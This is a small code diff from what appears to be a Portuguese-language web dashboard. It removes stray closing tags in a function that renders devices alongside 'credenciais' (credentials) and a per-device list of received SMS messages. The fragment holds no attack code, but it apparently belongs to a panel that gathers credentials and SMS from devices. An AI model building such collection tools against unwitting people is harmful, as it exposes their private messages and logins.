@@ -1568,9 +1568,6 @@ function renderLista(dispositivos, credenciais) {
         </div>
       `).join('')}
 </div>
-  </div>
-</div>
-      `).join("")}</div>
       <div class="timeline-title" onclick="toggleSMS(${idArg})">💬 SMS recebidas (${todasSMS.filter(s=>s.device_id===dev.device_id).length}) <span id="sms-chevron-${idAttr}">▶</span></div>
       <div class="timeline" id="sms-${idAttr}" style="display:none">
         ${todasSMS.filter(s=>s.device_id===dev.device_id).map(s=>{const ms=Number(s.timestamp_ms),t=Number.isFinite(ms)?formatDate(new Date(ms).toISOString()):"—";return `
